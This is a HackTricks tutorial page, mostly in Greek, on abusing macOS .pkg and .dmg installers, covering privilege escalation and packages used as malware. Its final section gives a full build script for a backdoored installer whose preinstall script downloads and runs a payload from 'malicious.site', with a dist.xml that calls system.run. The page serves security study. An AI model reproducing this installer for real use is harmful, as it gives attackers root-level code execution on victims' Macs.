# macOS Installers Abuse

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Pkg Basic Information

Ένα **πακέτο εγκατάστασης** macOS (γνωστό και ως αρχείο `.pkg`) είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS για να **διανέμει λογισμικό**. Αυτά τα αρχεία είναι σαν ένα **κουτί που περιέχει τα πάντα που χρειάζεται ένα κομμάτι λογισμικού** για να εγκατασταθεί και να λειτουργήσει σωστά.

Το αρχείο πακέτου είναι ένα αρχείο που περιέχει μια **ιεραρχία αρχείων και καταλόγων που θα εγκατασταθούν στον στόχο** υπολογιστή. Μπορεί επίσης να περιλαμβάνει **σενάρια** για την εκτέλεση εργασιών πριν και μετά την εγκατάσταση, όπως η ρύθμιση αρχείων διαμόρφωσης ή η καθαριότητα παλαιών εκδόσεων του λογισμικού.

### Hierarchy

<figure><img src="../../../.gitbook/assets/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

* **Distribution (xml)**: Προσαρμογές (τίτλος, κείμενο καλωσορίσματος…) και έλεγχοι σεναρίων/εγκατάστασης
* **PackageInfo (xml)**: Πληροφορίες, απαιτήσεις εγκατάστασης, τοποθεσία εγκατάστασης, διαδρομές προς σενάρια προς εκτέλεση
* **Bill of materials (bom)**: Λίστα αρχείων προς εγκατάσταση, ενημέρωση ή αφαίρεση με δικαιώματα αρχείων
* **Payload (CPIO archive gzip compresses)**: Αρχεία προς εγκατάσταση στην `install-location` από το PackageInfo
* **Scripts (CPIO archive gzip compressed)**: Σενάρια προ και μετά την εγκατάσταση και περισσότερους πόρους που εξάγονται σε έναν προσωρινό κατάλογο για εκτέλεση.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil —expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files ina. more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
In order to visualize the contents of the installer without decompressing it manually you can also use the free tool [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

## DMG Basic Information

DMG αρχεία, ή Apple Disk Images, είναι μια μορφή αρχείου που χρησιμοποιείται από το macOS της Apple για εικόνες δίσκων. Ένα αρχείο DMG είναι ουσιαστικά μια **mountable disk image** (περιέχει το δικό του σύστημα αρχείων) που περιέχει ακατέργαστα δεδομένα μπλοκ που συνήθως είναι συμπιεσμένα και μερικές φορές κρυπτογραφημένα. Όταν ανοίγετε ένα αρχείο DMG, το macOS **το τοποθετεί σαν να ήταν φυσικός δίσκος**, επιτρέποντάς σας να έχετε πρόσβαση στα περιεχόμενά του.

{% hint style="danger" %}
Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.
{% endhint %}

### Hierarchy

<figure><img src="../../../.gitbook/assets/image (225).png" alt=""><figcaption></figcaption></figure>

Η ιεραρχία ενός αρχείου DMG μπορεί να είναι διαφορετική ανάλογα με το περιεχόμενο. Ωστόσο, για τα DMG εφαρμογών, συνήθως ακολουθεί αυτή τη δομή:

* Top Level: Αυτό είναι η ρίζα της εικόνας δίσκου. Συνήθως περιέχει την εφαρμογή και πιθανώς έναν σύνδεσμο στον φάκελο Εφαρμογών.
* Application (.app): Αυτή είναι η πραγματική εφαρμογή. Στο macOS, μια εφαρμογή είναι συνήθως ένα πακέτο που περιέχει πολλά μεμονωμένα αρχεία και φακέλους που συνθέτουν την εφαρμογή.
* Applications Link: Αυτός είναι ένας συντομευμένος σύνδεσμος στον φάκελο Εφαρμογών στο macOS. Ο σκοπός αυτού είναι να διευκολύνει την εγκατάσταση της εφαρμογής. Μπορείτε να σύρετε το αρχείο .app σε αυτή τη συντόμευση για να εγκαταστήσετε την εφαρμογή.

## Privesc via pkg abuse

### Execution from public directories

Εάν ένα σενάριο προ- ή μετά την εγκατάσταση εκτελείται για παράδειγμα από **`/var/tmp/Installerutil`**, και ο επιτιθέμενος μπορούσε να ελέγξει αυτό το σενάριο, θα μπορούσε να κλιμακώσει τα δικαιώματα όποτε εκτελείται. Ή ένα άλλο παρόμοιο παράδειγμα:

<figure><img src="../../../.gitbook/assets/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Αυτή είναι μια [δημόσια συνάρτηση](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) που αρκετοί εγκαταστάτες και ενημερωτές θα καλέσουν για να **εκτελέσουν κάτι ως root**. Αυτή η συνάρτηση δέχεται το **μονοπάτι** του **αρχείου** που θα **εκτελεστεί** ως παράμετρο, ωστόσο, εάν ένας επιτιθέμενος μπορούσε να **τροποποιήσει** αυτό το αρχείο, θα μπορούσε να **καταχραστεί** την εκτέλεσή του με root για να **κλιμακώσει τα δικαιώματα**.
```bash
# Breakpoint in the function to check wich file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this missconfig
```
Για περισσότερες πληροφορίες, ελέγξτε αυτή την ομιλία: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Εκτέλεση μέσω προσάρτησης

Εάν ένας εγκαταστάτης γράφει στο `/tmp/fixedname/bla/bla`, είναι δυνατόν να **δημιουργηθεί μια προσάρτηση** πάνω από το `/tmp/fixedname` χωρίς ιδιοκτήτες, ώστε να μπορείτε να **τροποποιήσετε οποιοδήποτε αρχείο κατά τη διάρκεια της εγκατάστασης** για να εκμεταλλευτείτε τη διαδικασία εγκατάστασης.

Ένα παράδειγμα αυτού είναι το **CVE-2021-26089** που κατάφερε να **επικαλύψει ένα περιοδικό σενάριο** για να αποκτήσει εκτέλεση ως root. Για περισσότερες πληροφορίες, ρίξτε μια ματιά στην ομιλία: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg ως κακόβουλο λογισμικό

### Κενό Payload

Είναι δυνατόν να δημιουργηθεί απλώς ένα **`.pkg`** αρχείο με **προ και μετά την εγκατάσταση σενάρια** χωρίς κανένα πραγματικό payload εκτός από το κακόβουλο λογισμικό μέσα στα σενάρια.

### JS στο Distribution xml

Είναι δυνατόν να προστεθούν **`<script>`** ετικέτες στο **distribution xml** αρχείο του πακέτου και αυτός ο κώδικας θα εκτελείται και μπορεί να **εκτελεί εντολές** χρησιμοποιώντας **`system.run`**:

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

### Εγκαταστάτης με πίσω πόρτα

Κακόβουλος εγκαταστάτης που χρησιμοποιεί ένα σενάριο και κώδικα JS μέσα στο dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options customize="allow" require-scripts="false"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Buil final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Αναφορές

* [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0\_zobQ)
* [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
* [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
* [https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm\_source=pocket\_shared#heading-exploiting-installer-packages)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
